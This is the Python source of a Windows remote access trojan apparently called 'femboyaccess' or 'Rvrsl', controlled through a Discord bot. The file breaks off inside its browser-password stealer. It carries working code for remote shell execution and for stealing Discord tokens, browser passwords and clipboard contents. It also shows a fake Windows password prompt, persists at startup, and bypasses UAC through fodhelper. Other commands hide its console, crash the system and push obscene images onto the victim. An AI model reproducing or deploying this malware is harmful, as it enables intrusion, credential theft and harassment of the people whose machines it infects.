import os
import discord
import subprocess
import requests
import json
import pyautogui
import ctypes
import random
import asyncio
import win32gui
import win32con
from win32api import RGB, GetSystemMetrics
import sys
import webbrowser
import random
import asyncio
from playsound import playsound
import winreg
import time
import inspect
import win32crypt
import comtypes
import sqlite3
import win32com.client as wincl
import pyperclip
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from pynput.keyboard import Key, Controller
import re
import win32api
import datetime 
from win32api import *
from discord.ext import commands
import win32gui
import pyaudio
import psutil
import winsound
import win32gui
import plistlib
import win32process
from win32ui import *
from win32con import *
import aiohttp
import patoolib
import shutil
import pyautogui as auto
import tkinter
from PIL import Image, ImageTk, ImageDraw, ImageFont
from io import BytesIO
import ipaddress
import socket
import numpy
import imageio
import nacl
from win32file import *
from plyer import notification
from tkinter import Toplevel
import threading
import cv2

#//  VARIABLES AND CONSTANTS (DO NOT TOUCH ANYTHING EXCEPT GUILD_ID AND TOKEN)  \\#
version = "(version: 1.8)"
guild_id = ""
token = ""
login = os.getlogin()
client = discord.Client(intents=discord.Intents.all())
session_id = os.urandom(4).hex()
session_name = os.getlogin() + "-" + session_id
get_cmds = False
random_mouse_running = False
random_volume_control = False
spamtext = False
stealth = False
MB_OK = 0x00000000
MB_OKCANCEL = 0x00000001
MB_YESNO = 0x00000004
MB_ICONERROR = 0x00000010
MB_ICONINFORMATION = 0x00000040
MB_ICONWARNING = 0x00000030
MB_ICONQUESTION = 0x00000020
SRCCOPY = 0x00EE0086
user32 = ctypes.windll.user32
femboyaccess_dir = os.path.dirname(os.path.abspath(__file__))
new_femboyaccess_dir = "C:\Desktop"
###################################################################################

commands_list = [
	"help - self-explanatory",
	"ping - self-explanatory",
	"cd - self-explanatory",
	"ls - self-explanatory",
	"download <file> - download a specific file from the victim's computer",
	"cmd - execute a CMD command",
	"run <file> - run a file",
	"screenshot - say cheese!",
	"bsod - self-explanatory",
	"startup - add femboyaccess to startup",
	"gore - shows a gore photo",
	"bbc - shows a bbc photo",
	"randommousemovements - randomly moves the user's mouse location",
	"randomvolume - changes the volume value randomly",
	"getclipboard - fetches the victim's clipboard and sends it",
	"escalate - tries to escalate privileges [DETECTED]",
	"whoami - checks if femboyaccess is running as user or admin",
	"msgbox <message> <title> - sends a message box",
	"background <url> - changes the background to a specific image",
	"playsound <url> - plays a sound using its url",
	"doxx - fetches information from ipapi.co like city, zip..",
	"blockinput - blocks inputs",
	"unblockinput - unblocks inputs",
	"tts - text-to-speech message",
	"windowsphish - sends a fake windows security update pop-up asking for a password",
	"displayoff - turns off screen",
	"displayon - turns on screen",
	"tokens - fetches discord tokens",
	"critproc - makes the RAT a critical process",
	"uncritproc - makes RAT a normal process",
	"idletime - shows how much time the user has been idle",
	"passwords - fetches passwords from the user's browsers",
	"streamscreen <duration> - records the victim's screen and send it as a video file",
	"pid - gets the current pid",
	"localtime - fetches the user's local time",
	"timeset <year> <month> <day> <hour> <minute> - changes the system's time to a new one",
	"webcampic - takes a pic from the user's webcam",
	"fuckmbr - overwrites the master boot record (FUCKS THEIR PC OVER)",
	"createfile - creates a file in a specified size in mb",
	"regedit <key_path> <value_name> <new_value> - edits a regedit value",
	"taskkill <name> - kills a process",
	"processes - lists all the running processes",
	"disabletaskmgr - disables the task manager",
	"enabletaskmgr - enables the task manager",
	"highbeep <duration> - plays a high beep noise",
	"lowbeep <duration> - plays a low beep noise",
	"custombeep <frequency> <duration> - plays a custom-frequency beep noise",
	"piano - play piano using embed buttons",
	"gdi <mode> <time> - executes GDI effects",
	"opencd - opens the cd tray",
	"closecd - closes the cd tray",
	"spamtext <text> - shows text all over the screen using GDI",
	"sus - downlaods the entire among us game, unzips it and starts it",
	"shutdown - performs a computer shutdown",
	"restart - performs a computer restart",
	"recordcamera - records camera output (type 'stop' to stop and send the output)",
	"write - writes a custom message using the keyboard",
	"question - sends a question pop-up",
	"hidetaskbar - hides the taskbar",
	"showtaskbar - shows the taskbar",
	"webredirect <redirection_link> <websites> - redirects websites to another link using the hosts file",
	"forkbomb - executes a windows forkbomb",
	"mkdir <directory> - creates a new directory",
	"rm <file/directory> - removes a file or directory",
	"chmod <permissions> <file/directory> - changes the permissions of a file or directory",
	"instantmic - joins a voice channel and plays the victim's microphone input",
	"notification <title> <description> - sends a windows notification",
	"wifipasswords - fetches the wifi passwords and send them",
	"injectclipboard <text> - injects custom text to clipboard",
	"exit - exit this session"
]

commands = "".join(commands_list)
max_chars_per_message = 1500
command_chunks = [commands[i:i + max_chars_per_message] for i in range(0, len(commands), max_chars_per_message)]
if get_cmds:
	with open("cmds.txt", "w") as file:
		for command in commands:
			file.write(command + "\n")

async def startup(file_path=""):
	temp = os.getenv("TEMP")
	bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % login
	with open(bat_path + '\\' + "Update.bat", "w+") as bat_file:
		bat_file.write(r'start "" "%s"' % femboyaccess_dir)

async def start_random_mouse_movements():
	global random_mouse_running
	while random_mouse_running:
		x_offset = random.randint(-10, 10)
		y_offset = random.randint(-10, 10)
		pyautogui.move(x_offset, y_offset, duration=0.02)
		await asyncio.sleep(0.02)

async def start_random_volume_control():
	global random_volume_control
	while random_volume_control:
		volume_change = random.randint(-10, 10)
		pyautogui.press("volumeup" if volume_change > 0 else "volumedown")
		pyautogui.PAUSE = random.uniform(0.5, 2)
		await asyncio.sleep(0.02)

async def start_screen_streaming(message, duration):
	output_file = f'C:\\Users\\{os.getlogin()}\\recording.mp4'
	screen_width, screen_height = pyautogui.size()
	screen_region = (0, 0, screen_width, screen_height)
	frames = []
	fps = 30
	num_frames = duration * fps
	start_time = time.time()
	try:
		for _ in range(num_frames):
			img = pyautogui.screenshot(region=screen_region)
			frame = numpy.array(img)
			frames.append(frame)
		imageio.mimsave(output_file, frames, fps=fps, quality=8)
		await message.channel.send(await femboyaccess("streamscreen", "finished recording! "), file=discord.File(output_file))
		subprocess.run(f'del {output_file}', shell=True)
	except Exception as e:
		print(e)
		await message.channel.send(await femboyaccess("streamscreen", "could not record! :c"))

async def check_privileges():
	try:
		if ctypes.windll.shell32.IsUserAnAdmin():
			return "admin"
		else:
			return "user"
	except:
		return "idk"

async def femboyaccess(title, description):
	full_title = f"Rvrsl - {title} _ {version}"
	full_description = description

	message = f"```ansi\n{full_title}\n\n{full_description}```"
	return message

async def msgbox(ctx, *, args):
	params = args.split('"')
	message = params[1].strip() if len(params) >= 2 else ""
	title = params[3].strip() if len(params) >= 4 else ""
	await ctx.reply(await femboyaccess("msgbox", f"successfully sent the message box! "))
	await asyncio.sleep(0.2)
	ctypes.windll.user32.MessageBoxW(0, message, title, 0x40 | 0x1)  # MB_OK | MB_ICONINFORMATION

def find_tokens(path):
	path += '\\Local Storage\\leveldb'

	tokens = []

	for file_name in os.listdir(path):
		if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
			continue

		for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
			for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
				for token in re.findall(regex, line):
					tokens.append(token)
	return tokens

def set_system_time(year, month, day, hour, minute):
	win32api.SetSystemTime(year, month, 0, day, hour, minute, 0, 0)

def change_registry_value(key_path, value_name, new_value):
	try:
		command = f'reg add "{key_path}" /v "{value_name}" /t REG_SZ /d "{new_value}" /f'
		subprocess.run(command, shell=True, check=True)
		return 1
	except subprocess.CalledProcessError:
		return -1

def in_venv():
	return sys.prefix != sys.base_prefix

def get_running_processes():
	process_list = []
	for process in psutil.process_iter(['pid', 'name']):
		process_list.append(f"pid: {process.info['pid']}, name: {process.info['name']}")
	return process_list

key_frequencies = {
	'A': 440,
	'B': 493,
	'C': 261,
	'D': 293,
	'E': 329,
	'F': 349,
	'G': 392
}

async def create_piano_embed(message):
	piano_embed = discord.Embed(title=f"vrsl - piano-- unleash your inner beethovern  {version}", description="click a key to play the according sound! ")
	for key in key_frequencies:
		piano_embed.add_field(name=key, value='\u200b', inline=True)
	return await message.reply(embed=piano_embed)

class MyView(discord.ui.View):
	def __init__(self, piano_message):
		super().__init__()
		self.piano_message = piano_message

	async def interaction_check(self, interaction):
		if interaction.message.id == self.piano_message.id:
			return True
		return False

	async def on_button_click(self, interaction):
		custom_id = interaction.data['custom_id']
		if custom_id in key_frequencies:
			frequency = key_frequencies[custom_id]
			winsound.Beep(frequency, 500)

	@discord.ui.button(label='A', style=discord.ButtonStyle.primary, custom_id='A')
	async def a_button(self, interaction: discord.Interaction, button: discord.ui.Button):
		await interaction.response.defer(ephemeral=True)
		await self.on_button_click(interaction)

	@discord.ui.button(label='B', style=discord.ButtonStyle.primary, custom_id='B')
	async def b_button(self, interaction: discord.Interaction, button: discord.ui.Button):
		await interaction.response.defer(ephemeral=True)
		await self.on_button_click(interaction)

	@discord.ui.button(label='C', style=discord.ButtonStyle.primary, custom_id='C')
	async def c_button(self, interaction: discord.Interaction, button: discord.ui.Button):
		await interaction.response.defer(ephemeral=True)
		await self.on_button_click(interaction)

	@discord.ui.button(label='D', style=discord.ButtonStyle.primary, custom_id='D')
	async def d_button(self, interaction: discord.Interaction, button: discord.ui.Button):
		await interaction.response.defer()
		await self.on_button_click(interaction)

	@discord.ui.button(label='E', style=discord.ButtonStyle.primary, custom_id='E')
	async def e_button(self, interaction: discord.Interaction, button: discord.ui.Button):
		await interaction.response.defer(ephemeral=True)
		await self.on_button_click(interaction)

	@discord.ui.button(label='F', style=discord.ButtonStyle.primary, custom_id='F')
	async def f_button(self, interaction: discord.Interaction, button: discord.ui.Button):
		await interaction.response.defer(ephemeral=True)
		await self.on_button_click(interaction)

	@discord.ui.button(label='G', style=discord.ButtonStyle.primary, custom_id='G')
	async def g_button(self, interaction: discord.Interaction, button: discord.ui.Button):
		await interaction.response.defer(ephemeral=True)
		await self.on_button_click(interaction)

async def print_on_screen(ctx, *, args):
	global spamtext
	params = args.split('"')
	text = params[1].strip()
	realx = GetSystemMetrics(0)
	realy = GetSystemMetrics(1)
	while spamtext:
		x = random.randint(0, int(realx))
		y = random.randint(0, int(realy))
		hdc = win32gui.GetDC(0)
		color = RGB(0, 0, 0)
		font = win32gui.GetStockObject(17)
		win32gui.SetTextColor(hdc, color)
		win32gui.SelectObject(hdc, font)
		rect = (x, y, 0, 0)
		win32gui.DrawText(hdc, text, -1, rect, DT_LEFT | DT_NOCLIP)
		win32gui.ReleaseDC(0, hdc)
		await asyncio.sleep(0.001)

async def write_file(response, filename):
	with open(filename, "wb") as f:
		while True:
			chunk = await response.content.read(1024 * 8)
			if not chunk:
				break
			f.write(chunk)

async def download_sus(message):
	url = "https://cdn.discordapp.com/attachments/1121413968158797905/1121415167704580176/Among.Us.v2023.6.13i.rar"
	filename = "sus.rar"
	async with aiohttp.ClientSession() as session:
		async with session.get(url) as response:
			if response.status != 200:
				await message.reply(await femboyaccess("sus", f"error while downloading among us: {response.status} :c"))
				return
			await write_file(response, filename)
	await message.reply(await femboyaccess("sus", "among us downloaded! "))
	unzip_directory = os.path.splitext(filename)[0]
	try:
		patoolib.extract_archive(filename, outdir=unzip_directory)
	except patoolib.util.PatoolError as e:
		await message.reply(await femboyaccess("sus", f"error while extracting among us: {str(e)} :c"))
		return
	os.remove(filename)
	await message.reply(await femboyaccess("sus", "among us unzipped! "))
	game_directory = os.path.join(unzip_directory, "Among.Us.v2023.6.13i")
	game_executable = os.path.join(game_directory, "Among Us.exe")
	ctypes.windll.shell32.ShellExecuteW(None, "open", game_executable, None, game_directory, 1)
	await message.reply(await femboyaccess("sus", "among us started successfully! "))

async def download(message, url: str, dest: str = "c:\\", download_percent = True) -> None:

	"""function that can be uses to download files from an url and destination parameters
		::param url: Url of the file (it must be direct link)
		::param dest: it indicates where the file must be saved, it must include the filename with extension
	"""
	r = requests.get(url, allow_redirects=True, stream=True)
	BLOCK_SIZE = 1024 # amount of data by interation
	total_size = int(r.headers.get("content-length", 0)) # total iteration size
	dl_list = []
	if download_percent:
		try:
			with open(dest,"wb") as file:
				i=0
				for b in r.iter_content(BLOCK_SIZE): # get all bytes of the response
					file.write(b) # write the byte
					# progress bar : 0%|==========>|100%  => [progress%]
					i+=len(b)
					progress = (i/total_size)*100
					visual_progress = "0%|"+ "="*int(progress/10)+">" + "|100%" + " => " + f"[{progress:.2f}%]"
					if int(progress) %10 == 0 and int(progress) != 0  and int(progress) not in dl_list :
						dl_list.append(int(progress))
						await message.reply(await femboyaccess("download", visual_progress))
			
				completed = "0%|"+ "="*10+">" + "|100%" + " => " + f"[100.00%]"
				#print(completed) # because the download can be stuck even if it's completed
				await message.reply(completed)

		except requests.exceptions.HTTPError as err: # search for HTTP errors
			await message.reply(f"HTTP error occurred: {err}")
		except Exception as err:
			await message.reply(f"error happened during download: {err}") # search for all others error
	else:
		try:
			open(dest,"wb").write(r.content) # MUCH FASTER WAY
			message.reply('Download Ended !!')
		except requests.exceptions.HTTPError as err:  # search for HTTP errors
			await message.reply(f"HTTP error occurred: {err}")
		except Exception as err:
			await message.reply(f"An error occurred during the download: {err}")  # search for all others error

def open_registry_key(key_path):
	return winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS)

def set_registry_value(key, name, value):
	winreg.SetValueEx(key, name, 0, winreg.REG_SZ, value)

def close_registry_key(key):
	winreg.CloseKey(key)

def set_persistence():
	startup_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
	key = open_registry_key(startup_key)
	set_registry_value(key, "fa", rf"{new_femboyaccess_dir}")
	close_registry_key(key)

async def create_image(command_list):
	max_commands_per_side = 30
	image_width = 1800
	line_height = 30
	font_size = 20

	num_commands = len(command_list)
	num_commands_left = min(num_commands, max_commands_per_side)
	num_commands_right = max(0, num_commands - max_commands_per_side)

	image_height = max(num_commands_left, num_commands_right) * line_height

	image = Image.new("RGB", (image_width, image_height), "black")
	draw = ImageDraw.Draw(image)

	font = ImageFont.truetype("arial.ttf", font_size)

	y_position = 10

	for i in range(num_commands_left):
		draw.text((10, y_position), command_list[i], fill="#FFFFFF", font=font)
		y_position += line_height

	if num_commands_right > 0:
		y_position = 10
		x_position = image_width // 2 + 10
		for i in range(num_commands_left, num_commands):
			draw.text((x_position, y_position), command_list[i], fill="#FFFFFF", font=font)
			y_position += line_height

	return image

class PyAudioPCM(discord.AudioSource):
	def __init__(self, channels=2, rate=48000, chunk=960, input_device=0) -> None:
		p = pyaudio.PyAudio()
		self.chunks = chunk
		self.input_stream = p.open(
			format=pyaudio.paInt16,
			channels=channels,
			rate=rate,
			input=True,
			input_device_index=input_device,
			frames_per_buffer=chunk
		)

	def read(self) -> bytes:
		return self.input_stream.read(self.chunks)



@client.event
async def on_ready():
	guild = client.get_guild(int(guild_id))
	channel = await guild.create_text_channel(session_name)
	data = requests.get("https://ipapi.co/json/").json()
	country = data['country_name']
	ip = data['ip']

	vmcheck = in_venv()
	if vmcheck == False:
		isvm = "no"
	else:
		isvm = "yes"

	await channel.send  (f"""```ansi
Rvrsl - new session created

- session: {session_id}
- username: {os.getlogin()}
- ip: {country}, {ip}
- is vm: {isvm}
```""")
import ctypes

async def handle_stealth_mode(channel, stealth, femboyaccess):
    whnd = ctypes.windll.kernel32.GetConsoleWindow()
    
    if stealth:
        if whnd != 0:
            try:
                ctypes.windll.user32.ShowWindow(whnd, 0)
                await channel.send(await femboyaccess("stealth", "Python window has been hidden!"))
            except:
                await channel.send(await femboyaccess("stealth", "Could not hide the Python window! :c"))

        try:
            ctypes.windll.kernel32.SetConsoleTitleW("totallysvchost")
            await channel.send(await femboyaccess("stealth", "Changed process name!"))
        except:
            await channel.send(await femboyaccess("stealth", "Failed to change process name! :c"))

        # shutil.move(__file__, os.path.join(new_femboyaccess_dir, os.path.basename(__file__)))

@client.event
async def on_message(message):
	global random_mouse_running
	global random_volume_control
	global stream_screen
	global streaming_screen_file
	global spamtext
	if message.author == client.user:
		return

	if message.channel.name != session_name:
		return

	if message.content == "help":
		image = await create_image(commands_list)
		image_path = f"C:\\Users\\{os.getlogin()}\\cmds.png"
		image.save(image_path)
		await message.reply(file=discord.File(image_path))
		os.remove(image_path)

	if message.content == "ping":
		await message.reply(await femboyaccess("ping", f"{round(client.latency * 1000)}ms"))

	if message.content.startswith("cd"):
		directory = message.content.split(" ")[1]
		try:
			os.chdir(directory)
			await message.reply(await femboyaccess("cd", f"changed directory! \n\n{os.getcwd()}"))
		except:
			await message.reply(await femboyaccess("cd", f"unknown directory! :c"))

	if message.content == "ls":
		files = "\n".join(os.listdir())
		if files == "":
			files = "no files found!"
		await message.reply(await femboyaccess("ls", files))

	if message.content.startswith("download"):
		url = message.content.split(" ")[1]
		path = message.content.split(" ")[2]
		try:
			download_percent = message.content.split("")[3]
			if download_percent == "true":
				await download(message,url,path, True)

			elif download_percent == "false":
				await download(message,url,path, False)
			else:
				await download(message,url,path, False)

		except Exception as e:
			await download(message,url,path)




	if message.content.startswith("shell"):
		command = message.content.split(" ")[1]
		output = subprocess.Popen(
			["powershell.exe", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
		).communicate()[0].decode("utf-8")
		if output == "":
			output = "no output! :c"
		await message.reply(f"""```ansi
\033[2;Rvrsl - shell 

\033[2;37mshell > {os.getcwd()}
\033[0m\033[2;35m
\033[2;37m{output}\033[0m\033[2;35m\033[0m```""")


	if message.content.startswith("run"):
		file = message.content.split(" ")[1]
		subprocess.Popen(file, shell=True)
		await message.reply(f"""```ansi
\033[2;Rvrsl - run

\033[2;37mstarted {file}!\033[0m\033[2;35m\033[0m```""")

	if message.content.startswith("exit"):
		await message.channel.delete()
		await client.close()
	
	if message.content.startswith("startup"):
		await message.reply("""```ansi
\033[2;35mRvrsl - startup 

\033[2;37mRvrsl will now launch at startup!\033[0m\033[2;35m\033[0m```""")
		await startup()
		
	if message.content.startswith("bsod"):
		await message.reply("attempting..", delete_after = .1)
		ntdll = ctypes.windll.ntdll
		prev_value = ctypes.c_bool()
		res = ctypes.c_ulong()
		ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
		if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
			await message.reply(await femboyaccess("bsod", "bsod successful! "))
		else:
			await message.reply(await femboyaccess("bsod", "bsod failed! :c"))

	if message.content.startswith("screenshot"):
		screenshot = pyautogui.screenshot()
		path = os.path.join(os.getenv("TEMP"), "screenshot.png")
		screenshot.save(path)
		file = discord.File(path)
		await message.reply(
    """```
Rvrsl - screenshot 

screenshot done, see attached file
```""", 
    file=file
)
	if message.content.startswith("gore"):
		# This will open the specified URL in the default web browser
		webbrowser.open("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQK-21zC6B8NKZhIg5dsUGdqPGzChux8GoW_CxVv48nlLJ6wSaD-eXpSNNA_yZ3widfOr8&usqp=CAU", new=0)
		await message.reply("```\ngored```")

	if message.content.startswith("spaget"):
			webbrowser.open("https://video314.monstercockland.com/mcl/media/photos/thumbs/358992.jpg", new=0)
			await message.reply("```\spaget```")

	if message.content.startswith("bbc"):
			webbrowser.open("https://upload.wikimedia.org/wikipedia/commons/thumb/3/32/Male_micro.jpg/800px-Male_micro.jpg", new=0)
			await message.reply("```\BBCed```")

	if message.content.startswith("randommousemovements"):
		if not random_mouse_running:
			random_mouse_running = True
			asyncio.create_task(start_random_mouse_movements())
			await message.reply(await femboyaccess("random mouse movements", "random mouse movements toggled on! "))
		else:
			random_mouse_running = False
			await message.reply(await femboyaccess("random mouse movements", "random mouse movements toggled off! "))

	if message.content.startswith("randomvolume"):
		if not random_volume_control:
			random_volume_control = True
			asyncio.create_task(start_random_volume_control())
			await message.reply(await femboyaccess("random volume control", "random volume control toggled on! "))
		else:
			random_volume_control = False
			await message.reply(await femboyaccess("random volume control", "random volume control toggled off! "))

	if message.content.startswith("getclipboard"):
		output = os.popen("powershell Get-Clipboard").read()
		if output != "":
			clipboard = f"clipboard fetched successfully! \n\n{output}"
		else:
			clipboard = "nothing found in clipboard! :c"
		await message.reply(await femboyaccess("fetch clipboard", clipboard))

	if message.content.startswith("escalate"):
		def isAdmin():
			try:
				is_admin = (os.getuid() == 0)
			except AttributeError:
				is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
			return is_admin
		if isAdmin():
			await message.reply(await femboyaccess("escalate privileges", "already admin u fucking retard! "))
		else:
			class disable_fsr():
				disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
				revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
				def __enter__(self):
					self.old_value = ctypes.c_long()
					self.success = self.disable(ctypes.byref(self.old_value))
				def __exit__(self, type, value, traceback):
					if self.success:
						self.revert(self.old_value)
			await message.reply(await femboyaccess("escalate privileges", "attempting to escalate privileges.."))
			esex = False
			if (sys.argv[0].endswith("exe")):
				esex = True
			if not esex:
				test_str = sys.argv[0]
				current_dir = inspect.getframeinfo(inspect.currentframe()).filename
				cmd2 = current_dir
				create_reg_path = """ powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force """
				os.system(create_reg_path)
				create_trigger_reg_key = """ powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force """
				os.system(create_trigger_reg_key) 
				create_payload_reg_key = """powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start python """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
				os.system(create_payload_reg_key)
			else:
				test_str = sys.argv[0]
				current_dir = test_str
				cmd2 = current_dir
				create_reg_path = """ powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force """
				os.system(create_reg_path)
				create_trigger_reg_key = """ powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force """
				os.system(create_trigger_reg_key) 
				create_payload_reg_key = """powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
				os.system(create_payload_reg_key)
			with disable_fsr():
				os.system("fodhelper.exe")  
			time.sleep(2)
			remove_reg = """ powershell Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force """
			os.system(remove_reg)

	if message.content.startswith("whoami"):
		value = await check_privileges()
		await message.reply(await femboyaccess("whoami", f"currently running as: {value} "))

	if message.content.startswith("msgbox"):
		await msgbox(message, args=message.content)
		await message.reply(await femboyaccess("msgbox", f"the user saw your message, hope they like it "))

	if message.content.startswith("background"):
		if len(message.content.split(" ")) > 1:
			image_url = message.content.split(" ")[1]
		else:
			image_url = "https://theweereview.com/wp-content/uploads/2020/06/Obonjo-1-e1591133876509.jpg"

		response = requests.get(image_url)
		if response.status_code == 200:
			file_path = os.path.join(os.getenv("TEMP"), "background.jpg")
			with open(file_path, "wb") as f:
				f.write(response.content)
			ctypes.windll.user32.SystemParametersInfoW(20, 0, file_path, 3)
			await message.reply(await femboyaccess("background", "new background successfully applied! "))
		else:
			await message.reply(await femboyaccess("background", "failed to apply new background!"))

	if message.content.startswith("playsound"):
		attachment = message.attachments[0] if message.attachments else None
		if attachment:
			file_path = os.path.join(os.getenv("TEMP"), attachment.filename)
			await attachment.save(file_path)
			playsound(file_path.replace("\\", "/"))
			await message.reply(await femboyaccess("playsound", "sound has been played! "))
		else:
			await message.reply(await femboyaccess('playsound', 'please attach a sound file.'))

	if message.content.startswith("doxx"):
		data = requests.get("https://ipapi.co/json/").json()
		ip = data["ip"]
		ipver = data["version"]
		region = data["region"]
		city = data["city"]
		country = data["country"]
		postal = data["postal"]
		lat = data["latitude"]
		lon = data["longitude"]
		org = data["org"]
		money = data["currency"]
		network = data["network"]
		await message.reply(await femboyaccess('doxx', f'user doxxed! \n\nip/version: {network}\nnetwork: {ip}/{ipver}\nIP: {currency}\ncurrency: {country}\ncountry: {region}\nregion: {city}\ncity: {postal}\nzip: {lat}/{lon}\nlatitude/longitude: \norganisation: {org}'))

	if message.content.startswith("blockinput"):
		is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
		if is_admin:
			ctypes.windll.user32.BlockInput(True)
			await message.reply(await femboyaccess("blockinput", "blocked inputs successfully! "))
		else:
			await message.reply(await femboyaccess("blockinput", "admin rights are required for this command"))

	if message.content.startswith("unblockinput"):
		is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
		if is_admin:
			ctypes.windll.user32.BlockInput(False)
			await message.reply(await femboyaccess("unblockinput", "unblocked inputs successfully! "))
		else:
			await message.reply(await femboyaccess("unblockinput", "admin rights are required for this command"))

	if message.content.startswith("tts"):
		speak = wincl.Dispatch("SAPI.SpVoice")
		speak.Speak(message.content[4:])
		comtypes.CoUninitialize()
		await message.reply(await femboyaccess("tts", "text transmitted! "))

	if message.content.startswith("windowsphish"):
		fem = "$cred=$host.ui.promptforcredential('Windows Security Update','',[Environment]::UserName,[Environment]::UserDomainName);"
		boy = 'echo $cred.getnetworkcredential().password;'
		full_cmd = 'Powershell "{} {}"'.format(fem,boy)
		instruction = full_cmd

		def shell():   
			output = subprocess.run(full_cmd, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			return output

		result = str(shell().stdout.decode('CP437'))
		await message.reply(await femboyaccess("windowsphish", "text transmitted! "))
		await message.reply(await femboyaccess("windowsphish", f"password used: {result}"))

	if message.content.startswith("displayoff"):
		is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
		if is_admin == True:
			user32.SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
			await message.reply(await femboyaccess("displayoff", "screen has been turned off! "))
		else:
			await message.reply(await femboyaccess("displayoff", "admin rights are required for this command, silly "))

	if message.content.startswith("displayon"):
		is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
		if is_admin == True:
			user32.SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1)
			await message.reply(await femboyaccess("displayoff", "screen has been turned off! "))
		else:
			await message.reply(await femboyaccess("displayoff", "admin rights are required for this command, silly "))

	if message.content.startswith("tokens"):
		local = os.getenv('LOCALAPPDATA')
		roaming = os.getenv('APPDATA')

		paths = {
			'Discord': roaming + '\\Discord',
			'Discord Canary': roaming + '\\discordcanary',
			'Discord PTB': roaming + '\\discordptb',
			'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
			'Opera': roaming + '\\Opera Software\\Opera Stable',
			'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
			'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
		}

		msg = ""

		for platform, path in paths.items():
			if not os.path.exists(path):
				continue

			msg += f'\n- {platform} -\n\n'

			tokens = find_tokens(path)

			if len(tokens) > 0:
				for token in tokens:
					msg += f'{token}\n'
			else:
				msg += 'no tokens found! :c\n'
		await message.reply(await femboyaccess("tokens", msg))

	if message.content.startswith("critproc"):
		try:
			ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
			ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
			await message.reply(await femboyaccess("critproc", "Rvrsl is now a critical process! "))
		except:
			await message.reply(await femboyaccess("critproc", "could not turn Rvrsl into a critical process! :c"))
	if message.content.startswith("uncritproc"):
		try:
			ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0
			await message.reply(await femboyaccess("uncritproc", "Rvrsl is no longer a critical process! "))
		except:
			await message.reply(await femboyaccess("uncritproc", "could not turn Rvrsl into a normal process! :c"))

	if message.content.startswith("idletime"):
		class LASTINPUTINFO(ctypes.Structure):
			_fields_ = [
				('cbSize', ctypes.c_uint),
				('dwTime', ctypes.c_int),
			]
		def get_idle_duration():
			lastInputInfo = LASTINPUTINFO()
			lastInputInfo.cbSize = ctypes.sizeof(lastInputInfo)
			if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lastInputInfo)):
				millis = ctypes.windll.kernel32.GetTickCount() - lastInputInfo.dwTime
				return millis / 1000
			else:
				return 0
		duration = get_idle_duration()
		await message.reply(await femboyaccess("idletime", f"user has been idle for {duration} seconds! "))

	if message.content.startswith("passwords"):
		await message.reply(await femboyaccess("passwords", "stealing passwords from browsers.. "))
		passwords = ""
		try:
			# chrome
			if os.path.exists(os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data"):
				shutil.copy2(os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data", "LoginData.db")
				conn = sqlite3.connect("LoginData.db")
				cursor = conn.cursor()
				cursor.execute("SELECT action_url, username_value, password_value FROM logins")
				for result in cursor.fetchall():
					password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1].decode()
					passwords += f"website: {result[0]}\nusername: {result[1]}\npassword: {password}\n\n"
				conn.close()
				os.remove("LoginData.db")
			# firefox
			elif os.path.exists(os.getenv("APPDATA") + "\\Mozilla\\Firefox\\Profiles\\"):
				profiles = os.listdir(os.getenv("APPDATA") + "\\Mozilla\\Firefox\\Profiles\\")
				for profile in profiles:
					if os.path.exists(os.getenv("APPDATA") + "\\Mozilla\\Firefox\\Profiles\\" + profile + "\\logins.json"):
						with open(os.getenv("APPDATA") + "\\Mozilla\\Firefox\\Profiles\\" + profile + "\\logins.json", "r") as f:
							data = json.load(f)
							for login in data["logins"]:
